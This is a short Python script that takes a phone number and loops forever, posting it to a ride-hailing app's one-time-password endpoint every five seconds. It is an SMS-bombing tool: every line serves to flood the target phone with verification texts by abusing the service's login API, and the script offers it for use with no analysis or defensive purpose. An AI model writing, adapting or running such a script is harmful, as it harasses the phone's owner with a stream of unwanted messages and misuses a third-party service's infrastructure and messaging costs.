import requests
import time
number = input("Enter The Phone Number = ")

urlsend = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
mydata = {"cellphone":"+98"+number}
while True :
      requests.post(urlsend,data=mydata)
      print("Done")
      time.sleep(5)
      
